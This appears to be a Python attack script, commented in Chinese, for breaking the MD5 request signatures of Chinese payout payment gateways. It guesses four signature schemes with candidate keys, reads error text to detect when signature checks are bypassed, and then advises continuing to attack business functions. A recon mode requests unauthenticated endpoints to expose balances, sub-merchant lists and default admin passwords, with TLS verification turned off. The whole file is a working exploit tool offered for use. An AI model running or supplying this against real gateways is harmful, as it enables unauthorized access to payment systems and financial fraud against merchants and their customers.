#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
代付网关签名破法探针 (daifu_sign_probe)
======================================
中文代付平台网关的 MD5 签名「一键多变体」自动匹配 + 验签进度判读 + 无鉴权信息面侦察。

依据: payment-gateway-api/references/daifu-signature-and-platform-families.md

用法
----
# ① 无鉴权信息面侦察(先跑这个, 常有惊喜: 余额/子商户/默认密钥)
python3 daifu_sign_probe.py --recon --url https://gw.example.com

# ② 签名匹配(参数字典 + 候选密钥)
python3 daifu_sign_probe.py --url https://gw.example.com/order/api/v1/merchant \\
    --params '{"merchantNo":"20812","timestamp":"1699999999"}' --key hjH6uKGByrnqecDy

# ③ 多把密钥批量试
python3 daifu_sign_probe.py ... --keys key1,key2

# ④ 只看会发什么, 不真发
python3 daifu_sign_probe.py ... --dry-run

# ⑤ 签名放 header (YHPay 类: AppKey/Nonce/CurTime/CheckSum)
python3 daifu_sign_probe.py ... --in header --extra-header AppKey=o3N2zX0Zjm

判读规约(核心)
----
  响应含「签名不能为空/不可为空」  → 字段名错(试另一个: sign<->sing)
  响应含「签名验证失败/签名错误」  → 算法或密钥错
  两者都没有(报的是别的业务错误) → **验签已过**, 拿这个组合继续打业务
"""
import argparse, hashlib, json, sys, time

try:
    import requests
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    requests = None

SIG_MISSING = ["签名不能为空", "签名不可为空", "sign is required", "sign不能为空", "sign不可为空", "缺少签名"]
SIG_FAIL = ["签名验证失败", "签名错误", "签名不合法", "签名不正确", "校验失败", "sign error", "sign invalid", "验签失败"]

# 无鉴权信息面候选(实测命中过: CKPLR 余额/子商户、RuoYi 初始密码键、天成列枚举)
RECON_GET = [
    "/api/front/channel/balance",
    "/api/front/channel/subMch",
    "/api/front/channel/syncBalance",
    "/prod-api/system/config/configKey/sys.user.initPassword",
    "/prod-api/lws/merchant/list?pageSize=10",
    "/member/site/column?table=member&value=id&label=merchant",
]


def pairs_sorted(p):
    """ASCII 升序 + 空值剔除 + 布尔转小写 + 签名字段自身不参与"""
    items = []
    for k, v in p.items():
        if k in ("sign", "sing") or v in (None, ""):
            continue
        if isinstance(v, bool):
            v = "true" if v else "false"
        items.append((k, v))
    return "&".join(f"{k}={v}" for k, v in sorted(items))


def build_variants(params, key, nonce=None, curtime=None):
    """返回 [(变体名, 签名值)], 覆盖已落盘的四种真实变体"""
    nonce = nonce or str(int(time.time() * 1000))
    curtime = curtime or str(int(time.time()))
    base = pairs_sorted(params)
    out = [
        # CKPLR/CRMEB-Java、天鸿: 排序 + &key= + 大写
        ("v1 &key= upper  (CKPLR/天鸿)",
         hashlib.md5((base + f"&key={key}").encode()).hexdigest().upper()),
        # RuoYi lwsdeployv: 排序 + &SecretKey= + 小写
        ("v2 &SecretKey= lower (RuoYi族)",
         hashlib.md5((base + f"&SecretKey={key}").encode()).hexdigest()),
        # YHPay 银河: CheckSum = md5(nonce+curTime+appSecret) 小写
        ("v3 CheckSum lower (YHPay)",
         hashlib.md5((nonce + curtime + key).encode()).hexdigest()),
        # 天成 SCUI: 假签, 任意非空即过
        ("v4 fake 'x' (天成类假签)", "x"),
    ]
    return out, nonce, curtime


def judge(text):
    t = (text or "")
    low = t.lower()
    for h in SIG_MISSING:
        if h.lower() in low:
            return "MISSING(字段名错?)"
    for h in SIG_FAIL:
        if h.lower() in low:
            return "FAIL(算法/密钥错)"
    return "PASS? 验签可能已过"


def do_recon(url):
    url = url.rstrip("/")
    print(f"\n=== 无鉴权信息面侦察: {url} ===")
    if requests is None:
        print("! 需要 requests: pip install requests")
        return
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126"})
    for p in RECON_GET:
        try:
            r = s.get(url + p, timeout=12, verify=False)
            body = (r.text or "").replace("\n", " ")[:180]
            flag = "<== 有数据?" if (r.status_code == 200 and len(r.text) > 40) else ""
            print(f"[{r.status_code}] {len(r.content):>6}B {p} {flag}")
            if body:
                print(f"        {body}")
        except Exception as e:
            print(f"[ERR] {p} {type(e).__name__}: {str(e)[:60]}")


def main():
    ap = argparse.ArgumentParser(description="代付网关签名破法探针", formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="网关接口完整 URL, 或 --recon 时给根地址")
    ap.add_argument("--params", default="{}", help="业务参数字典(JSON)")
    ap.add_argument("--key", default="", help="候选密钥(单把)")
    ap.add_argument("--keys", default="", help="候选密钥(逗号分隔, 多把批量试)")
    ap.add_argument("--fields", default="sign,sing", help="签名字段名候选, 默认 sign,sing")
    ap.add_argument("--in", dest="loc", default="body", choices=["body", "query", "header"], help="签名位置")
    ap.add_argument("--extra-header", action="append", default=[], help="额外 header k=v (YHPay 类)")
    ap.add_argument("--method", default="POST")
    ap.add_argument("--recon", action="store_true", help="只跑无鉴权信息面侦察")
    ap.add_argument("--dry-run", action="store_true", help="只打印将发送的请求, 不真发")
    a = ap.parse_args()

    if a.recon:
        do_recon(a.url)
        return

    if not a.key and not a.keys:
        ap.error("需要 --key 或 --keys")
    keys = [k for k in (a.keys.split(",") if a.keys else [a.key]) if k]
    try:
        params = json.loads(a.params)
    except json.JSONDecodeError as e:
        ap.error(f"--params 不是合法 JSON: {e}")

    if requests is None and not a.dry_run:
        print("! 需要 requests: pip install requests")
        sys.exit(1)

    s = None
    if not a.dry_run:
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0 Chrome/126", "Content-Type": "application/x-www-form-urlencoded"})
        for kv in a.extra_header:
            k, _, v = kv.partition("=")
            s.headers[k] = v

    print(f"\n目标: {a.method} {a.url}   位置={a.loc}   密钥数={len(keys)}")
    print("=" * 96)
    hits = []
    for key in keys:
        variants, nonce, curtime = build_variants(params, key)
        for vname, sig in variants:
            for field in [f.strip() for f in a.fields.split(",") if f.strip()]:
                data = dict(params)
                hdrs = {}
                if a.loc in ("body", "query"):
                    data[field] = sig
                else:
                    hdrs[field] = sig
                label = f"{vname[:26]:<26} | {field:<4} | key={key[:14]:<14}"
                if a.dry_run:
                    print(f"[dry] {label} -> {a.method} {a.url}")
                    print(f"      data={json.dumps(data, ensure_ascii=False)[:200]}")
                    if hdrs:
                        print(f"      headers={hdrs}")
                    print(f"      Nonce={nonce} CurTime={curtime}")
                    continue
                try:
                    if a.loc == "header":
                        r = s.request(a.method, a.url, data=data, headers=hdrs, timeout=15, verify=False)
                    elif a.loc == "body":
                        r = s.post(a.url, data=data, timeout=15, verify=False)
                    else:
                        r = s.request(a.method, a.url, params=data, timeout=15, verify=False)
                    verdict = judge(r.text)
                    print(f"[{r.status_code}] {label} => {verdict}")
                    print(f"      {r.text.replace(chr(10), ' ')[:170]}")
                    if verdict.startswith("PASS"):
                        hits.append((vname, field, key, r.text[:200]))
                except Exception as e:
                    print(f"[ERR] {label} => {type(e).__name__}: {str(e)[:60]}")

    print("=" * 96)
    if a.dry_run:
        print("dry-run 结束(未发请求)。去掉 --dry-run 实跑。")
    elif hits:
        print(f"★ 疑似验签通过 {len(hits)} 个组合:")
        for vname, field, key, txt in hits:
            print(f"  - {vname} / field={field} / key={key} => {txt}")
    else:
        print("未发现 PASS 组合。检查: 字段名(--fields) / 签名位置(--in) / 是否缺必填业务参数。")


if __name__ == "__main__":
    main()
